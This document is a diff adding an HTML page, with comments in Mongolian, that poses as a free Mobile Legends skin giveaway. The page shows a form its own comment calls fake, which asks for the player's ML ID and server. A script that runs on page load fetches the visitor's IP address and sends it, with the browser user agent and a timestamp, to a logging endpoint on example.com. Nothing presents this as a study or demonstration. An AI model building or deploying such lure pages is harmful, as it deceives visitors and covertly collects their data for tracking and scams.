@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>🔥 Claim Your Free ML Skin!</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding-top: 100px; }
+  </style>
+</head>
+<body>
+  <h2>🎁 Get Your Epic Mobile Legends Skin!</h2>
+  <p>Confirm your account to receive your skin.</p>
+
+  <!-- Хуурамч форм -->
+  <form action="#">
+    ML ID: <input type="text" name="mlid"><br><br>
+    Server: <input type="text" name="server"><br><br>
+    <button>Claim Now</button>
+  </form>
+
+  <script>
+    // IP-г авна
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        fetch("https://example.com/log.php", {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            ip: data.ip,
+            ua: navigator.userAgent,
+            time: new Date().toISOString()
+          })
+        });
+      });
+  </script>
+</body>
+</html>
